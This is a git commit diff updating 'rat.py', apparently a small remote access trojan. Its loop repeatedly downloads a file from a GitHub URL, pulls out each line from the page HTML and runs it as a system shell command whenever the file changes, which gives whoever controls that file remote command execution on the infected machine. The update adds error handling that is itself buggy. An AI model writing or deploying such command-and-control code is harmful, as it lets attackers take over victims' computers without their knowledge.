78fd8a8b67cd49bde12382440b692e2fd0cff831
MrR3B00T <48889817+hmzdgn@users.noreply.github.com>
2022-01-13 12:36:15 +0300

    Update rat.py

--- rat.py
+++ rat.py
@@ -4,23 +4,33 @@ from time import sleep as slp
 from html import unescape
 control=[]
 while True:
-    page= unescape(req("https://github.com/hmzdgn/Cloud/blob/main/rat").text)
-    i=1
-    start=[]
-    finish=[]
-    while True:
-        start.append(page.find('<td id="LC{}" class="blob-code blob-code-inner js-file-line">'.format(i))+60)
-        if start[-1] != 59:
-            finish.append(page.find("</td>",start[-1]))
-        else:
-            start.remove(59)
-            break
-        i=i+1
-    commands=[]
-    for i in range(len(start)):
-        commands.append(page[start[i]:finish[i]])
-    if control != commands:
-        for i in commands:
-            sys(i)
-    slp(1.5)
-    control=commands.copy()
+    try:
+        page= unescape(req("https://github.com/hmzdgn/Cloud/blob/main/rat").text)
+        i=1
+        start=[]
+        finish=[]
+        while True:
+            start.append(page.find('<td id="LC{}" class="blob-code blob-code-inner js-file-line">'.format(i))+60)
+            if start[-1] != 59:
+                finish.append(page.find("</td>",start[-1]))
+            else:
+                try:
+                    err=0
+                    start.remove(59)
+                except error:
+                    print("error")
+                    err=1
+                break
+            if err==1:
+                continue
+            i=i+1
+        commands=[]
+        for i in range(len(start)):
+            commands.append(page[start[i]:finish[i]])
+        if control != commands:
+            for i in commands:
+                sys(i)
+        slp(1.5)
+        control=commands.copy()
+    except error:
+        print("error")
